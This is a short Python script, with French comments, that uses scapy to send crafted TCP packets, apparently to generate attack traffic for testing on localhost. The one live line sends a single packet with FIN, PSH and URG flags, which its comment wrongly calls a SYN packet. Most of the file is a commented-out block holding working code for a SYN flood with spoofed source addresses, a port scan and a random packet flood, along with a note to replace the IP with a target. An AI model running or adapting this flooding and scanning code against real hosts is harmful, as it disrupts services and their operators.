from scapy.all import *
import datetime


# Envoyer un paquet SYN vers l'adresse IP locale
ip = "127.0.0.1"
port = 80
syn_packet = IP(dst=ip)/TCP(dport=port, flags='FPU')
send(syn_packet)


'''
from scapy.all import IP, TCP, send
import random
import time

# Configuration des cibles
target_ip = "127.0.0.1"  # Remplacer par l'IP cible
ports_to_scan = [22, 80, 443, 8080]  # Ports à scanner

def syn_flood(target_ip, port, count):
    """
    Simule un flood SYN sur une cible à un port donné.
    """
    print(f"Lancement du SYN Flood sur {target_ip}:{port}")
    for _ in range(count):
        ip_layer = IP(dst=target_ip, src=f"192.168.1.{random.randint(2, 254)}")
        tcp_layer = TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)  # Envoi du paquet
        time.sleep(0.01)  # Petite pause entre chaque paquet
    print(f"SYN Flood sur {target_ip}:{port} terminé.")

def random_port_scan(target_ip, port_list, count):
    """
    Simule un scan de ports aléatoires.
    """
    print(f"Lancement du Scan de Ports sur {target_ip}")
    for _ in range(count):
        port = random.choice(port_list)
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        time.sleep(0.1)  # Pause entre chaque tentative de scan
    print(f"Scan de Ports terminé sur {target_ip}")

def flood_packets(target_ip, count):
    """
    Envoi de paquets aléatoires en grand nombre.
    """
    print(f"Envoi d'un flood de paquets sur {target_ip}")
    for _ in range(count):
        ip_layer = IP(dst=target_ip, src=f"192.168.1.{random.randint(2, 254)}")
        tcp_layer = TCP(dport=random.randint(1024, 65535), sport=random.randint(1024, 65535))
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
    print(f"Flood de paquets terminé sur {target_ip}")

if __name__ == "__main__":
    syn_flood(target_ip, port=80, count=250)
'''